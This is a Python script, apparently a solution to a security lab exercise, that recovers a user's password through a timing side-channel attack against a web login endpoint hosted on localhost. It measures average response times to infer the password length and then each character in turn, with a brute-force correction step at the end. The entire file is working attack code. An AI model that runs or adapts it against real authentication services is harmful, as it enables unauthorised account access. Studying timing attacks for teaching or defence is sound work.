import time
import requests
import numpy as np

# Configuration
SERVER_URL = "http://127.0.0.1"  # Replace with the server URL, currently hosting on localhost
USER_ID = "326647914"  # Replace with your ID/Username
DIFFICULTY = 1  # Adjust difficulty if needed
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
RETRIES = 10  # Number of measurements for each character for greater accuracy
SIGNIFICANT_THRESHOLD = 1.15  # Factor to determine a significant time increase in time to skip iteration


def measure_time(user, password, difficulty):
    """
    Measures the response time for a given password.
    Returns the average time after several attempts.
    """
    url = f"{SERVER_URL}/?user={user}&password={password}&difficulty={difficulty}"
    timings = np.zeros(RETRIES)  # Initialize NumPy array for timings

    for i in range(RETRIES):
        try:
            start = time.time()
            response = requests.get(url)
            end = time.time()
            timings[i] = end - start  # Store timing
        except requests.exceptions.RequestException as e:
            print(f"Connection error: {e}")
            return float("inf"), ""
    
    return np.mean(timings), response.text.strip()


def find_password_length(user, difficulty):
    """
    Finds the length of the password using average response times.
    """
    print("Determining password length...")
    base_password = "a"

    prev_time = 0
    for length in range(1, 33):  # Test lengths up to 32
        test_password = base_password * length
        response_time, _ = measure_time(user, test_password, difficulty)
        print(f"Length {length}, average time: {response_time:.5f}s")

        if response_time > prev_time + 0.02:  # Adjust the threshold for difficulty
            print(f"Estimated length: {length}")
            return length
        prev_time = response_time

    print("No length found.")
    return None


def find_password(user, difficulty, length):
    """
    Finds the password by exploiting average response times.
    Adds a fast-path check: if a character takes significantly longer,
    it is immediately selected.
    """
    print(f"Searching for password of length {length}...")
    password = ""

    for position in range(length):
        times = np.zeros(len(CHARACTERS))  # Initialize NumPy array for timings

        for idx, char in enumerate(CHARACTERS):
            candidate = password + char + "a" * (length - len(password) - 1)
            response_time, _ = measure_time(user, candidate, difficulty)
            print(f"Testing '{candidate}': average time {response_time:.5f}s")
            times[idx] = response_time

            # Fast path check
            if idx > 4:  # Only check after a few iterations
                avg_time = np.mean(times[:idx])  # Calculate mean of previous timings
                if response_time > SIGNIFICANT_THRESHOLD * avg_time:
                    print(f"Fast-path selection: '{char}' due to significant time increase.")
                    password += char
                    break
        else:
            # Use numpy for max computation
            best_char = CHARACTERS[np.argmax(times)]
            password += best_char

        print(f"Partial password: {password}")

    # Final verification of the password
    _, response = measure_time(user, password, difficulty)
    if response == "1":
        print(f"Password found: {password}")
        return password
    else:
        print("The found password is not valid. Correcting...")
        return correct_password(user, difficulty, password)


def correct_password(user, difficulty, initial_password):
    """
    Corrects the password character by character if validation fails.
    """
    print(f"Correcting the initial password: {initial_password}")
    password = list(initial_password)

    for position in range(len(password)):
        for char in CHARACTERS:
            candidate = ''.join(password[:position] + [char] + password[position + 1:])
            _, response = measure_time(user, candidate, difficulty)
            print(f"Testing correction '{candidate}'")

            if response == "1":
                print(f"Corrected password found: {candidate}")
                return candidate

    print("Unable to correct the password.")
    return None


if __name__ == "__main__":
    # Step 1: Find the exact password length
    estimated_length = find_password_length(USER_ID, DIFFICULTY)

    # Step 2: Find the password with the estimated length
    if estimated_length:
        password = find_password(USER_ID, DIFFICULTY, estimated_length)
        if password:
            print(f"Final password: {password}")
